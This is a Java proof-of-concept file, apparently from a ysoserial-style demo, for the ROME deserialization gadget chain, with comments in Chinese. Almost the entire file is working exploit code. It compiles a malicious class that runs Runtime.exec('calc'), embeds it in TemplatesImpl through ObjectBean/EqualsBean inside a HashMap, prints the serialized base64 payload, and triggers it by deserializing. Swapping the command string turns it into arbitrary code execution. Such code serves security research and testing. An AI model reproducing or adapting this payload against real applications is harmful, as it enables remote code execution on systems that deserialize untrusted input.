package ysoserial.vulndemo;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.syndication.feed.impl.EqualsBean;
import com.sun.syndication.feed.impl.ObjectBean;
import com.sun.syndication.feed.impl.ToStringBean;
import javassist.CannotCompileException;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.NotFoundException;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.HashMap;

public class Rome_POC {
    //序列化操作工具
    public static String serialize(Object obj) throws IOException {
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream objOutput = new ObjectOutputStream(barr);
        objOutput.writeObject(obj);
        byte[] bytes = barr.toByteArray();
        objOutput.close();
        String bytesOfBase = Base64.getEncoder().encodeToString(bytes);
        return bytesOfBase;
    }
    //反序列化操作工具
    public static void unserialize(String bytesOfBase) throws IOException, ClassNotFoundException {
        byte[] bytes = Base64.getDecoder().decode(bytesOfBase);
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);
        ObjectInputStream objInput = new ObjectInputStream(byteArrayInputStream);
        objInput.readObject();
    }
    //为类的属性设置值的工具
    public static void setFieldVlue(Object obj, String fieldName, Object value) throws NoSuchFieldException, IllegalAccessException {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
    //payload的生成
    public static void exp() throws CannotCompileException, NotFoundException, IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException {
        //生成恶意的bytecodes
        String cmd = "java.lang.Runtime.getRuntime().exec(\"calc\");";
        ClassPool classPool = ClassPool.getDefault();
        CtClass ctClass = classPool.makeClass("evilexp");
        ctClass.makeClassInitializer().insertBefore(cmd);
        ctClass.setSuperclass(classPool.get(AbstractTranslet.class.getName()));
        byte[] bytes = ctClass.toBytecode();
        //因为在TemplatesImp类中的构造函数中，_bytecodes为二维数组
        byte[][] bytes1 = new byte[][]{bytes};

        //创建TemplatesImpl类
        TemplatesImpl templates = new TemplatesImpl();
        setFieldVlue(templates, "_name", "RoboTerh");
        setFieldVlue(templates, "_bytecodes", bytes1);
        setFieldVlue(templates, "_tfactory", new TransformerFactoryImpl());

        //封装一个无害的类并放入Map中
        ObjectBean roboTerh = new ObjectBean(ObjectBean.class, new ObjectBean(String.class, "RoboTerh"));
        HashMap hashmap = new HashMap();
        hashmap.put(roboTerh, "RoboTerh");

        //通过反射写入恶意类进入map中
        ObjectBean objectBean = new ObjectBean(Templates.class, templates);
        setFieldVlue(roboTerh, "_equalsBean", new EqualsBean(ObjectBean.class, objectBean));

        //生成payload并输出
        String payload = serialize(hashmap);
        System.out.println(payload);

        //触发payload，验证是否成功
        unserialize(payload);
    }

    public static void main(String[] args) throws NotFoundException, CannotCompileException, IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException {
        exp();
    }
}
